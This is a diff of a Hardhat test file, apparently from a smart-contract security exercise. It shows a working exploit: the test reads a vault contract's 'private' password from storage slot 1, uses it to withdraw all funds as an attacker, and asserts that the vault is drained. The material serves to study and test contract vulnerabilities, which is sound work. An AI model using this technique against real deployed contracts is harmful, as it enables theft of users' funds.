@@ -12,24 +12,35 @@ describe("Access control", function () {
    await this.vault.deposite({value : ethers.utils.parseEther('100')})
 })
  
-describe('Agreed Price', () => { 
-  it("should set price at deplotment ",async () => {
+
+  it("should able to access private variable  ",async () => {
     let intialAttackerBalance = await ethers.provider.getBalance(attacker.address)
-    console.log("Intial Attacker Balance",ethers.utils.formatEther(intialAttackerBalance))
     let intialValutBalance = await ethers.provider.getBalance(this.vault.address)
+
+    console.log("Intial Attacker Balance",ethers.utils.formatEther(intialAttackerBalance))
     console.log("Intial Vault Balance",ethers.utils.formatEther(intialValutBalance))
+
     const pwd = await ethers.provider.getStorageAt(this.vault.address,1)
+    let password = ethers.utils.parseBytes32String(pwd)
+    console.log("PASSWORD :", password)
     await this.vault.connect(attacker).withdraw(pwd)
+
+
     let finalAttackerBalance = await ethers.provider.getBalance(attacker.address)
-    console.log("Final Attacker Balance",ethers.utils.formatEther(finalAttackerBalance))
     let finalValutBalance = await ethers.provider.getBalance(this.vault.address)
+
+    console.log("Final Attacker Balance",ethers.utils.formatEther(finalAttackerBalance))
     console.log("Final Vault Balance",ethers.utils.formatEther(finalValutBalance))
+
+    expect(finalValutBalance).to.eq(0);
+    expect(finalAttackerBalance).to.gt(intialAttackerBalance)
+
   })
   
 })
 
    
-  })
+ 
 
  
 
